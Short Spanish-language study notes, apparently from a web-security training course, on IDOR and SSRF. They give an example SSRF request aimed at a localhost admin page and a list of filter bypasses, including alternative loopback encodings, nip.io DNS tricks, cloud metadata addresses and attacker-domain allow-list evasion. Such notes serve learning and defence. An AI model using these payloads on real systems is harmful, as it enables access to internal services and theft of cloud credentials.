## Insecure Direct Object Reference (IDOR)

Se usa un id para para aceder a un objeto de la BD y no se revisan los permisos del mismo.

	PUT /user/1/pass


## Server-Side Request Forgery (SSRF) 

	Hacer peticiones a algun recuerso dentro de la red.


```bash
	POST /product/stock HTTP/1.0
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 118

	stockApi=http://localhost/admin
```

### Bypass

Deny lists 

	Direcciones alternativas
		0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001
	Cambiar DNS
		127.0.0.1 => 127.0.0.1.nip.io
	Bloqueos de direcciones interesantes en cloud 	
		Tienen metadatos de los grupos de seguridad, eventos
		169.254.169.254
		: fd00:ec2::254

Allow lists

	Cambiando los DNS 
	de
	https://website.thm
	a
	https://website.thm.attackers-domain.thm








